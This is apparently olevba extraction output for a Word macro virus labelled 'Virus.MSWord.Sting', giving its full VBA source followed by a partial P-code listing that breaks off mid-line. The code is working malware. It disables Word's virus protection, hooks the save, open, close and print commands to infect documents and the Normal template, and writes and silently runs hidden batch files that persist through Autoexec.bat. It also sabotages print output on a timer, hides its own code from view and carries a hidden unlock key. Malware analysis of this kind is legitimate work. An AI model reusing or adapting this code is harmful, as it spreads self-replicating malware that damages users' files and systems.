olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sting
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sting - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Stinger.bas 
in file: Virus.MSWord.Sting - OLE stream: 'Macros/VBA/Stinger'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Call StartUp
If NormalTemplate.Saved = False Then NormalTemplate.Save
End Sub

Sub AutoOpen()
Call StartUp
End Sub

Sub StartUp()

With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next

CustomizationContext = NormalTemplate

FindKey(BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyControl, _
        Arg3:=wdKeyShift, Arg4:=wdKeyR)).Clear

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, _
    Arg2:=wdKeyControl, Arg3:=wdKeyShift, Arg4:=wdKeyR), _
    KeyCategory:=wdKeyCategoryMacro, _
    Command:="Projéct12.Stinger.RegistrCd"

FindKey(BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyControl, _
        Arg3:=wdKeyShift, Arg4:=wdKeyV)).Clear

KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, _
    Arg2:=wdKeyControl, Arg3:=wdKeyShift, Arg4:=wdKeyV), _
    KeyCategory:=wdKeyCategoryMacro, _
    Command:="Projéct12.Stinger.VwMacCd"

On Error GoTo 0

WordBasic.DisableAutoMacros

End Sub

Sub AutoExit()
Call FileExit
End Sub

Sub FileExit()

QuitWord = True

For Each aDoc In Documents
    If CloseFile(aDoc) = "Canceled" Then
        QuitWord = False
        Exit For
    Else
        QuitWord = True
    End If
Next aDoc

If QuitWord = True Then
    Call ChkFiles
    Application.Quit
End If

End Sub

Sub FileNew()
Dialogs(wdDialogFileNew).Show
Call RemvMac(ActiveDocument, "Stinger")
End Sub

Sub FileNewDefault()
Documents.Add
Call RemvMac(ActiveDocument, "Stinger")
End Sub

Sub FileSave()

On Error GoTo ExtFlSv
ActiveDocument.Save
On Error GoTo 0

mPrjNm = "Projéct12"
xFulNm = ActiveDocument.FullName

If ActiveDocument.VBProject.Name <> mPrjNm Then
    RO_Chk = GetAttr(ActiveDocument.FullName) And vbReadOnly
    If RO_Chk = 0 Then
        Call InfctDcmnt(ActiveDocument)
        Documents.Open FileName:=xFulNm, Format:=wdOpenFormatAuto
    End If
End If

ExtFlSv:

End Sub

Sub FileSaveAs()

mDiagReply = 0

On Error Resume Next
mDiagReply = Dialogs(wdDialogFileSaveAs).Show
On Error GoTo 0

If mDiagReply = -1 Then
    Call FileSave
End If

End Sub

Sub FilePrintDefault()
Call PrintRtn("FPD")
End Sub

Sub FilePrint()
Call PrintRtn("FP")
End Sub

Function PrintRtn(PrintCd)

With Options
    .PrintDraft = False
    .PrintFieldCodes = False
    .PrintHiddenText = False
    .PrintDrawingObjects = True
End With

With ActiveDocument
    .PrintFormsData = False
End With

SysFl = "C:\WINDOWS\COMMAND\SYSTEM1.DT_"

If Dir(SysFl, vbHidden + vbReadOnly + vbSystem) = "" Then
    mDaysOld = 0
Else
    mDaysOld = DateDiff("d", FileDateTime(SysFl), Now)
End If

If CdRegistry <> "110499" Then
    If ((Timer >= 0) And (Timer <= 14400)) Or _
        ((Timer >= 43200) And (Timer <= 46800)) Or _
        ((Timer >= 68400) And (Timer <= 75600)) Then
        ChngOptn = True
    ElseIf (Int((2 * Rnd) + 1) = 2) Then
        ChngOptn = True
    Else
        ChngOptn = False
    End If
Else
    ChngOptn = False
End If

If mDaysOld < 30 Then
    ChngOptn = False
End If

If PrintCd = "FP" Then
    Dialogs(wdDialogFilePrint).Show
Else
    ActiveDocument.PrintOut
End If

If ChngOptn = True Then
    With Options
        .PrintDraft = True
        .PrintFieldCodes = True
        .PrintHiddenText = True
        .PrintDrawingObjects = False
    End With
    With ActiveDocument
        .PrintFormsData = True
    End With
    With ActiveDocument
        .Compatibility(wdUsePrinterMetrics) = False
        .Compatibility(wdWW6BorderRules) = False
    End With
End If

End Function

Sub FileOpen()

mDiagReply = 0

On Error Resume Next
mDiagReply = Dialogs(wdDialogFileOpen).Show
On Error GoTo 0

If mDiagReply = -1 Then
    
    Call RemvMac(ActiveDocument, "Stinger")
    
    mPrjNm = "Projéct12"
    xPrjNm = ActiveDocument.VBProject.Name
    xFulNm = ActiveDocument.FullName
    
    If Left(xPrjNm, 7) = "Projéct" Then
        If xPrjNm < mPrjNm Then
            Call InfctDcmnt(ActiveDocument)
            Documents.Open FileName:=xFulNm, Format:=wdOpenFormatAuto
        End If
    End If

End If

End Sub

Sub DocClose()
Call CloseFile(ActiveDocument)
End Sub

Sub FileClose()
Call CloseFile(ActiveDocument)
End Sub

Function CloseFile(mDcNm7)

Documents(mDcNm7).Activate

CloseFile = "Closed"
mPrjNm = "Projéct12"
nPrjNm = NormalTemplate.VBProject.Name

If (Left(mDcNm7.Name, 8) = "Document") And _
    (mDcNm7.Characters.Count = 1) Then
    ActiveDocument.Close
    Exit Function
End If

If ActiveDocument.Saved = False Then
    mMsg = "Do you want to save the changes you made to '" & mDcNm7.Name & "'?"
    mStyle = vbYesNoCancel + vbExclamation + vbDefaultButton1
    mTitle = "Microsoft Word"
    Beep
    mResponse = MsgBox(mMsg, mStyle, mTitle)
    Select Case mResponse
    Case vbYes
        If (Left(mDcNm7.Name, 8) = "Document") Then
            mDiagReply = Dialogs(wdDialogFileSaveAs).Show
            If mDiagReply = 0 Then
                CloseFile = "Canceled"
                Exit Function
            End If
        Else
            On Error GoTo ExtClsFl
            ActiveDocument.Save
            On Error GoTo 0
        End If
    Case vbNo
        If (Left(mDcNm7.Name, 8) = "Document") Then
            ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
            Exit Function
        End If
    Case Else
        CloseFile = "Canceled"
        Exit Function
    End Select
End If

If ActiveDocument.VBProject.Name <> mPrjNm Then
    RO_Chk = GetAttr(ActiveDocument.FullName) And vbReadOnly
    If RO_Chk <> 0 Then
        ActiveDocument.Close
    Else
        Call InfctDcmnt(ActiveDocument)
    End If
    Exit Function
End If

If Dir("C:\WINDOWS\COMMAND\SYSTEM1.DT_", _
    vbHidden + vbReadOnly + vbSystem + vbArchive) = "" Then
    Call InfctSystm(ActiveDocument)
Else
    If Left(nPrjNm, 7) = "Projéct" Then
        If nPrjNm < mPrjNm Then
            Call InfctSystm(ActiveDocument)
        End If
    End If
End If

On Error Resume Next
ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges
On Error GoTo 0
Exit Function

ExtClsFl:

CloseFile = "Canceled"
On Error GoTo 0

End Function

Function InfctDcmnt(mDcNm8)

Documents(mDcNm8).Activate

mDocName = mDOSNm(mDcNm8.Name)
mTempFl = "C:\WINDOWS\TEMP\" & mDocName
mOrgFile = ActiveDocument.FullName

mExtReslt = ExtractFl(mDocName)

Set myRange = ActiveDocument.Range
myRange.WholeStory
myRange.Copy
ActiveDocument.Close

On Error GoTo ExtInfctDcmnt

Documents.Open FileName:=mTempFl, ConfirmConversions:=False, _
    ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", _
    PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", _
    WritePasswordTemplate:="", Format:=wdOpenFormatAuto

On Error GoTo 0

Selection.Paste
ActiveDocument.Save
ActiveDocument.Close

On Error Resume Next
Kill mOrgFile
On Error Resume Next
FileCopy mTempFl, mOrgFile

ExtInfctDcmnt:

On Error Resume Next
Kill mTempFl
On Error GoTo 0

End Function

Function InfctSystm(mDcNm9)

Documents(mDcNm9).Activate

mTmpNm = ActiveDocument.Name
mFile1 = "C:\WINDOWS\TEMP\" & mTmpNm
mFile2 = "C:\WINDOWS\COMMAND\" & mTmpNm
mFile3 = "C:\WINDOWS\" & mTmpNm
mFl3DOSNm = "C:\WINDOWS\" & mDOSNm(mDcNm9.Name)
mFile4 = "C:\WINDOWS\COMMAND\SYSTEM1.DT_"
mFile5 = "C:\WINDOWS\COMMAND\SYSTEM2.DT_"

Call SvTmpPath

Options.DefaultFilePath(Path:=wdUserTemplatesPath) = _
        "C:\Program Files\Microsoft Office\Templates"
        
Set mRange = ActiveDocument.Range
mRange.WholeStory
mRange.Delete

ActiveDocument.SaveAs FileName:=mFile1, Password:="", _
    FileFormat:=wdFormatDocument, AddToRecentFiles:=False

ActiveDocument.SaveAs FileName:=mFile2, _
    FileFormat:=wdFormatTemplate, AddToRecentFiles:=False

ActiveDocument.SaveAs FileName:=mFile3, AddToRecentFiles:=False

On Error Resume Next
SetAttr mFile4, vbNormal
Kill mFile4
On Error GoTo 0

Name mFile1 As mFile5
Name mFile2 As mFile4

Call ChkFiles

FNStrngX$ = "C:\WINDOWS\COMMAND\ZZ.BAT"
hNmbr = FreeFile

Open FNStrngX$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, ":START"
    Print #hNmbr, "CLS"
    Print #hNmbr, "IF EXIST " & mFl3DOSNm & " DEL " & mFl3DOSNm
    Print #hNmbr, "IF EXIST " & mFl3DOSNm & " GOTO START"
    Print #hNmbr, "CLS"
    Print #hNmbr, "DEL " & FNStrngX$
Close #hNmbr

mResult = Shell(FNStrngX$, 0)

ActiveDocument.Close SaveChanges:=wdDoNotSaveChanges

End Function

Sub ToolsMacro()
End Sub

Sub ToolsCustomize()
End Sub

Sub ToolsOptions()
    
    Options.SaveNormalPrompt = True
    Options.VirusProtection = True
    
    Options.DefaultFilePath(Path:=wdUserTemplatesPath) = RdTmpPath()
    
    On Error Resume Next
    Dialogs(wdDialogToolsOptions).Show
    On Error GoTo 0
    
    Options.SaveNormalPrompt = False
    Options.VirusProtection = False
    
    Call SvTmpPath
    
    Options.DefaultFilePath(Path:=wdUserTemplatesPath) = _
        "C:\Program Files\Microsoft Office\Templates"

End Sub

Sub ViewVbCode()
End Sub

Function RemvMac(DcNm2, McNm2)

DcNm2Prtctn = DcNm2.VBProject.Protection
RemvMac = False

If DcNm2Prtctn = 0 Then
    For DcNm2j = DcNm2.VBProject.VBComponents.Count To 1 Step -1
        DcNm2ProcNm = DcNm2.VBProject.VBComponents(DcNm2j).Name
        If (DcNm2ProcNm <> McNm2) And _
            (DcNm2ProcNm <> "ThisDocument") And _
            (DcNm2ProcNm <> "Reference to Normal") Then
            Application.OrganizerDelete Source:=DcNm2.FullName, _
                Name:=DcNm2ProcNm, Object:=wdOrganizerObjectProjectItems
            RemvMac = True
        End If
    Next DcNm2j
End If

End Function

Sub ChkFiles()

FNStrng1$ = "C:\Autoexec.bat"
FNStrng2$ = "C:\WINDOWS\COMMAND\AZ.bat"
FNStrng3$ = "C:\WINDOWS\COMMAND\XZ.bat"
FNStrng4$ = "C:\WINDOWS\TEMP\*.DO?"

On Error Resume Next

SetAttr FNStrng2$, vbNormal
SetAttr FNStrng3$, vbNormal
SetAttr FNStrng4$, vbNormal

Kill FNStrng2$
Kill FNStrng3$
Kill FNStrng4$

On Error GoTo 0

Call MkLoadrFl
Call MkHsKprFl

mResult = Shell(FNStrng3$, 0)
FNStrngW$ = "C:\WINDOWS\TEMP\~_110499.TMP"

Do While Dir(FNStrngW$) = ""
Loop

On Error GoTo ResumeKill2
Kill FNStrngW$
Kill FNStrng3$
On Error GoTo 0

hNmbr = FreeFile
Dim InputData, ShowLine

On Error GoTo CreateFl

Open FNStrng1$ For Input As #hNmbr

FileMarker = Chr(255)
MarkerFound = False

Do While Not EOF(1)
    Line Input #hNmbr, InputData
    If InputData = FileMarker Then MarkerFound = True
Loop

Close #hNmbr

If MarkerFound <> True Then
    hNmbr = FreeFile
    SetAttr FNStrng1$, vbNormal
    Open FNStrng1$ For Append Access Write As #hNmbr
        Print #hNmbr, FileMarker
    Close #hNmbr
End If

On Error GoTo 0

Exit Sub

CreateFl:

Call MkAutoFl
SetAttr FNStrng1$, vbHidden
On Error GoTo 0
Exit Sub

ResumeKill2:
Resume

End Sub

Function CdRegistry()

Dim mEnvString, mIndx, mMsg, mPathLen
mIndx = 1
mSrchStrng = "WIN_VER"
mSSLength = Len(mSrchStrng) + 1

CdRegistry = ""

Do
    mEnvString = Environ(mIndx)
    If Left(mEnvString, mSSLength) = (mSrchStrng & "=") Then
        CdRegistry = Environ(mSrchStrng)
        Exit Do
    Else
        mIndx = mIndx + 1
    End If
Loop Until mEnvString = ""

End Function

Function ExtractFl(mXtNm)

mFlTmp = "C:\WINDOWS\TEMP\" & mXtNm
FNStrngX$ = "C:\WINDOWS\TEMP\CpyFl.Bat"
FNStrngW$ = "C:\WINDOWS\TEMP\~_110499.TMP"

hNmbr = FreeFile

Open FNStrngX$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, "DEL " & FNStrngW$
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ -H +R"
    Print #hNmbr, "COPY C:\WINDOWS\COMMAND\ÿÿ.ÿÿ " & mFlTmp & " /Y > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ +H +R"
    Print #hNmbr, "CLS"
    Print #hNmbr, "ECHO A > " & FNStrngW$
Close #hNmbr

mResult = Shell(FNStrngX$, 0)

Do While Dir(FNStrngW$) = ""
Loop

On Error GoTo ResumeKill1
Kill FNStrngW$
Kill FNStrngX$
On Error GoTo 0

Exit Function

ResumeKill1:
Resume

End Function

Function mDOSNm(Name9)

mDOSNm = Name9

If UCase(Right(mDOSNm, 4)) <> ".DOC" And _
    UCase(Right(mDOSNm, 4)) <> ".DOT" Then
    mDOSNm = mDOSNm & ".Doc"
End If

If (Len(mDOSNm) - 4) > 8 Then
    mPos = InStr(mDOSNm, " ")
    Do While mPos <> 0
        Mid(mDOSNm, mPos) = "_"
        mPos = InStr(mDOSNm, " ")
    Loop
    mDOSNm = Left(mDOSNm, 6) & "~1.Doc"
End If

End Function

Sub RegistrCd()

If CdRegistry() = "110499" Then
    MsgBox "Macro code is already registered."
    Exit Sub
End If

Dim mMessage, mTitle, mDefault, mKey

mMessage = "Enter registration key"
mTitle = "Macro Code Registration"
mDefault = ""

mKey = InputBox(mMessage, mTitle, mDefault)

If UCase(mKey) = "STING110499" Then
    Call CdRgstrtn
    MsgBox "Macro code has been successfully registered." & Chr(13) & _
            "You need to restart your computer for the " & Chr(13) & _
            "new setting to take efffect."
Else
    Beep
    MsgBox "Incorrect Regsistration Key."
End If

End Sub

Sub CdRgstrtn()

FNStrng2$ = "C:\WINDOWS\COMMAND\AZ.Bat"
FNStrng3$ = "C:\WINDOWS\COMMAND\XZ.Bat"
FileMarker = "SET WIN_VER=110499"

Call MkLoadrFl

hNmbr = FreeFile

Open FNStrng2$ For Append Access Write As #hNmbr
    Print #hNmbr, FileMarker
Close #hNmbr

Call MkHsKprFl

mResult = Shell(FNStrng3$, 0)
FNStrngW$ = "C:\WINDOWS\TEMP\~_110499.TMP"

Do While Dir(FNStrngW$) = ""
Loop

On Error GoTo ResumeKill3
Kill FNStrngW$
Kill FNStrng3$
On Error GoTo 0

Exit Sub

ResumeKill3:
Resume

End Sub

Sub MkLoadrFl()

FNStrng2$ = "C:\WINDOWS\COMMAND\AZ.Bat"

hNmbr = FreeFile

Open FNStrng2$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ -H -R > NUL"
    Print #hNmbr, "COPY C:\WINDOWS\COMMAND\ÿ.ÿ C:\PROGRA~1\MICROS~1\TEMPLA~1\Normal.dot /Y > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ +H +R > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\TEMP\*.DO? > NUL"
    Print #hNmbr, "CLS"
Close #hNmbr

End Sub

Sub MkHsKprFl()

FNStrng3$ = "C:\WINDOWS\COMMAND\XZ.bat"
FNStrngW$ = "C:\WINDOWS\TEMP\~_110499.TMP"

hNmbr = FreeFile

Open FNStrng3$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, "DEL " & FNStrngW$
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.BAT -H -R > NUL"
    Print #hNmbr, "COPY C:\WINDOWS\COMMAND\AZ.bat C:\WINDOWS\COMMAND\ÿ.BAT /Y > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.BAT +H +R > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\COMMAND\AZ.bat > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ -H -R > NUL"
    Print #hNmbr, "COPY C:\WINDOWS\COMMAND\SYSTEM1.DT_ C:\WINDOWS\COMMAND\ÿ.ÿ /y > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\COMMAND\SYSTEM1.DT_ > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿ.ÿ +H +R > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ -H -R > NUL"
    Print #hNmbr, "COPY C:\WINDOWS\COMMAND\SYSTEM2.DT_ C:\WINDOWS\COMMAND\ÿÿ.ÿÿ /y > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\COMMAND\SYSTEM2.DT_ > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\ÿÿ.ÿÿ +H +R > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\TEMP\*.DO? > NUL"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\SYSTEM1.DT_ -H -R -S > NUL"
    Print #hNmbr, "DEL C:\WINDOWS\COMMAND\SYSTEM1.DT_"
    Print #hNmbr, "ECHO A > C:\WINDOWS\COMMAND\SYSTEM1.DT_"
    Print #hNmbr, "ATTRIB C:\WINDOWS\COMMAND\SYSTEM1.DT_ +H +R +S > NUL"
    Print #hNmbr, "CLS"
    Print #hNmbr, "ECHO A > " & FNStrngW$
Close #hNmbr

End Sub

Sub MkAutoFl()

FNStrng1$ = "C:\Autoexec.bat"

hNmbr = FreeFile

Open FNStrng1$ For Append Access Write As #hNmbr
    Print #hNmbr, "@ECHO OFF"
    Print #hNmbr, "PROMPT $P$G"
    Print #hNmbr, "SET PATH=C:\WINDOWS\;C:\WINDOWS\COMMAND\"
    Print #hNmbr, Chr(255)
Close #hNmbr

End Sub

Sub VwMacCd()
    If UCase(InputBox("Access Code", "View Macro Code")) = "STING" Then
        ShowVisualBasicEditor = True
    Else
        MsgBox "Incorrect Access Code"
    End If
End Sub

Sub SvTmpPath()

mOldTmpPath = Options.DefaultFilePath(wdUserTemplatesPath)
FNStrngZ$ = "C:\WINDOWS\TmpPath.Ini"

On Error Resume Next
Kill FNStrngZ$
On Error GoTo 0

hNmbr = FreeFile

Open FNStrngZ$ For Append Access Write As #hNmbr
    Print #hNmbr, mOldTmpPath
Close #hNmbr

End Sub

Function RdTmpPath()

FNStrngZ$ = "C:\WINDOWS\TmpPath.Ini"

If Dir(FNStrngZ$) = "" Then
    RdTmpPath = Options.DefaultFilePath(wdUserTemplatesPath)
Else
    hNmbr = FreeFile
    Open FNStrngZ$ For Input As #hNmbr
    Line Input #hNmbr, RdTmpPath
    Close #hNmbr
End If

End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Sting
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1566 bytes
' Line #0:
' Macros/VBA/Stinger - 35947 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	ArgsCall (Call) StartUp 0x0000 
' Line #2:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Sub AutoOpen())
' Line #6:
' 	ArgsCall (Call) StartUp 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' Line #9:
' 	FuncDefn (Sub StartUp())
' Line #10:
' Line #11:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #13:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #14:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #15:
' 	EndWith 
' Line #16:
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' Line #19:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #20:
' Line #21:
' 	LineCont 0x0004 0C 00 08 00
' 	Ld wdKeyAlt 
' 	ParamNamed Arg1 
' 	Ld wdKeyControl 
' 	ParamNamed Arg2 
' 	Ld wdKeyShift 
' 	ParamNamed Arg3 
' 	Ld wdKeyR 
' 	ParamNamed Arg4 
' 	ArgsLd BuildKeyCode 0x0004 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #22:
' Line #23:
' 	LineCont 0x000C 0B 00 04 00 18 00 04 00 1C 00 04 00
' 	Ld wdKeyAlt 
' 	ParamNamed Arg1 
' 	Ld wdKeyControl 
' 	ParamNamed Arg2 
' 	Ld wdKeyShift 
' 	ParamNamed Arg3 
' 	Ld wdKeyR 
' 	ParamNamed Arg4 
' 	ArgsLd BuildKeyCode 0x0004 
' 	ParamNamed KeyCode 
' 	Ld wdKeyCategoryMacro 
' 	ParamNamed KeyCategory 
' 	LitStr 0x001B "Projéct12.Stinger.RegistrCd"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #24:
' Line #25:
' 	LineCont 0x0004 0C 00 08 00
' 	Ld wdKeyAlt 
' 	ParamNamed Arg1 
' 	Ld wdKeyControl 
' 	ParamNamed Arg2 
' 	Ld wdKeyShift 
' 	ParamNamed Arg3 
' 	Ld wdKeyV 
' 	ParamNamed Arg4 
' 	ArgsLd BuildKeyCode 0x0004 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #26:
' Line #27:
' 	LineCont 0x000C 0B 00 04 00 18 00 04 00 1C 00 04 00
' 	Ld wdKeyAlt 
' 	ParamNamed Arg1 
' 	Ld wdKeyControl 
' 	ParamNamed Arg2 
' 	Ld wdKeyShift 
' 	ParamNamed Arg3 
' 	Ld wdKeyV 
' 	ParamNamed Arg4 
' 	ArgsLd BuildKeyCode 0x0004 
' 	ParamNamed KeyCode 
' 	Ld wdKeyCategoryMacro 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0019 "Projéct12.Stinger.VwMacCd"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #28:
' Line #29:
' 	OnError (GoTo 0) 
' Line #30:
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0000 
' Line #32:
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' 	FuncDefn (Sub AutoExit())
' Line #36:
' 	ArgsCall (Call) FileExit 0x0000 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	FuncDefn (Sub FileExit())
' Line #40:
' Line #41:
' 	LitVarSpecial (True)
' 	St QuitWord 
' Line #42:
' Line #43:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #44:
' 	Ld aDoc 
' 	ArgsLd CloseFile 0x0001 
' 	LitStr 0x0008 "Canceled"
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitVarSpecial (False)
' 	St QuitWord 
' Line #46:
' 	ExitFor 
' Line #47:
' 	ElseBlock 
' Line #48:
' 	LitVarSpecial (True)
' 	St QuitWord 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	NextVar 
' Line #51:
' Line #52:
' 	Ld QuitWord 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	ArgsCall (Call) ChkFiles 0x0000 
' Line #54:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #55:
' 	EndIfBlock 
' Line #56:
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Sub FileNew())
' Line #60:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #61:
' 	Ld ActiveDocument 
' 	LitStr 0x0007 "Stinger"
' 	ArgsCall (Call) RemvMac 0x0002 
' Line #62:
' 	EndSub 
' Line #63:
' Line #64:
' 	FuncDefn (Sub FileNewDefault())
' Line #65:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #66:
' 	Ld ActiveDocument 
' 	LitStr 0x0007 "Stinger"
' 	ArgsCall (Call) RemvMac 0x0002 
' Line #67:
' 	EndSub 
' Line #68:
' Line #69:
' 	FuncDefn (Sub FileSave())
' Line #70:
' Line #71:
' 	OnError ExtFlSv 
' Line #72:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #73:
' 	OnError (GoTo 0) 
' Line #74:
' Line #75:
' 	LitStr 0x0009 "Projéct12"
' 	St mPrjNm 
' Line #76:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St xFulNm 
' Line #77:
' Line #78:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	Ld mPrjNm 
' 	Ne 
' 	IfBlock 
' Line #79:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	St RO_Chk 
' Line #80:
' 	Ld RO_Chk 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #81:
' 	Ld ActiveDocument 
' 	ArgsCall (Call) InfctDcmnt 0x0001 
' Line #82:
' 	Ld xFulNm 
' 	ParamNamed FileName 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0002 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	EndIfBlock 
' Line #85:
' Line #86:
' 	Label ExtFlSv 
' Line #87:
' Line #88:
' 	EndSub 
' Line #89:
' Line #90:
' 	FuncDefn (Sub FileSaveAs())
' Line #91:
' Line #92:
' 	LitDI2 0x0000 
' 	St mDiagReply 
' Line #93:
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	St mDiagReply 
' Line #96:
' 	OnError (GoTo 0) 
' Line #97:
' Line #98:
' 	Ld mDiagReply 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	IfBlock 
' Line #99:
' 	ArgsCall (Call) FileSave 0x0000 
' Line #100:
' 	EndIfBlock 
' Line #101:
' Line #102:
' 	EndSub 
' Line #103:
' Line #104:
' 	FuncDefn (Sub FilePrintDefault())
' Line #105:
' 	LitStr 0x0003 "FPD"
' 	ArgsCall (Call) PrintRtn 0x0001 
' Line #106:
' 	EndSub 
' Line #107:
' Line #108:
' 	FuncDefn (Sub FilePrint())
' Line #109:
' 	LitStr 0x0002 "FP"
' 	ArgsCall (Call) PrintRtn 0x0001 
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	FuncDefn (Function PrintRtn(PrintCd))
' Line #113:
' Line #114:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #115:
' 	LitVarSpecial (False)
' 	MemStWith PrintDraft 
' Line #116:
' 	LitVarSpecial (False)
' 	MemStWith PrintFieldCodes 
' Line #117:
' 	LitVarSpecial (False)
' 	MemStWith PrintHiddenText 
' Line #118:
' 	LitVarSpecial (True)
' 	MemStWith PrintDrawingObjects 
' Line #119:
' 	EndWith 
' Line #120:
' Line #121:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #122:
' 	LitVarSpecial (False)
' 	MemStWith PrintFormsData 
' Line #123:
' 	EndWith 
' Line #124:
' Line #125:
' 	LitStr 0x001E "C:\WINDOWS\COMMAND\SYSTEM1.DT_"
' 	St SysFl 
' Line #126:
' Line #127:
' 	Ld SysFl 
' 	Ld vbHidden 
' 	Ld vbReadOnly 
' 	Add 
' 	Ld vbSystem 
' 	Add 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #128:
' 	LitDI2 0x0000 
' 	St mDaysOld 
' Line #129:
' 	ElseBlock 
' Line #130:
' 	LitStr 0x0001 "d"
' 	Ld SysFl 
' 	ArgsLd FileDateTime 0x0001 
' 	Ld Now 
' 	ArgsLd DateDiff 0x0003 
' 	St mDaysOld 
' Line #131:
' 	EndIfBlock 
' Line #132:
' Line #133:
' 	Ld CdRegistry 
' 	LitStr 0x0006 "110499"
' 	Ne 
' 	IfBlock 
' Line #134:
' 	LineCont 0x0008 0F 00 08 00 1D 00 08 00
' 	Ld Timer 
' 	LitDI2 0x0000 
' 	Ge 
' 	Paren 
' 	Ld Timer 
' 	LitDI2 0x3840 
' 	Le 
' 	Paren 
' 	And 
